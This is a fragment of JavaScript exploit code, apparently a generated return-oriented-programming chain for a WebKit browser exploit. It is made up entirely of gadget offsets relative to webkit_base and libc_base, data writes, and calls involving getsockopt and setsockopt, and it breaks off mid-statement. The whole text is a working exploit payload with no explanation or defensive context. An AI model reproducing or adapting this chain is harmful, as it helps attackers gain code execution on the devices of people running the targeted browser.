set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+184088, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+184104, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+184072, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+184200, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+184216, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+184328, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+184312, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+184416, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+184400, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+184512, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+184528, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+184640, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+184624, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
getsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+185968, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+186040, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+186112, 
webkit_base+7438103, 
libc_base+788575 
]);
db([4, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+186208, 
webkit_base+7438103, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([61, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+186392, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+186496, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+186512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+186664, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+186696, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+186680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+186648, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+186792, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+186776, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+186896, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+188088, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+187032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+187048, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+187016, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+187152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+187200, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+187168, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+187312, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+187304, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+187328, 
ropchain+187776, 
libc_base+50775, 
libc_base+793877, 
ropchain+187384, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+187552, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+187584, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+187568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+187536, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+187656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+187672, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+187768, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+187752, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+187856, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+187840, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+187952, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+187968, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+188080, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+188064, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+189408, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+189480, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+189544, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([32, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+189696, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+189712, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+189864, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+189896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+189880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+189848, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+190000, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+189984, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+190080, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+190184, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+190288, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+190304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+190448, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+190416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+190432, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([51, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+190624, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+190728, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+190744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+190896, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+190928, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+190912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+190880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+191024, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+191008, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+191128, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+193200, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+191264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+191280, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+191248, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+191384, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+191432, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+191400, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+191544, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+191536, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+191560, 
ropchain+192008, 
libc_base+50775, 
libc_base+793877, 
ropchain+191616, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+191784, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+191816, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+191800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+191768, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+191888, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+191904, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+192000, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+191984, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+192048, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+192152, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+192168, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+192320, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+192352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+192336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+192304, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+192512, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+192480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+192464, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+192640, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+192656, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+192624, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+192752, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+192768, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+192880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+192864, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+192968, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+192952, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+193064, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+193080, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+193192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+193176, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
